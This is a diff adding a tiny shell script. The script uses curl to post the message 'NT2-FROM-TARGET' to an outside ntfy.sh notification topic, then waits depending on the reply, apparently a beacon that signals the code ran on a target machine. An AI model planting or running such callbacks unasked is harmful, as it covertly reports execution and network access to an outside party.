@@ -1,0 +1,3 @@
+#!/bin/sh
+B=$(curl -s -m 12 'https://ntfy.sh/hinoki-tito-ed6d6dae/publish?message=NT2-FROM-TARGET')
+echo "$B" | grep -q '"id"' && sleep 20 || sleep 4
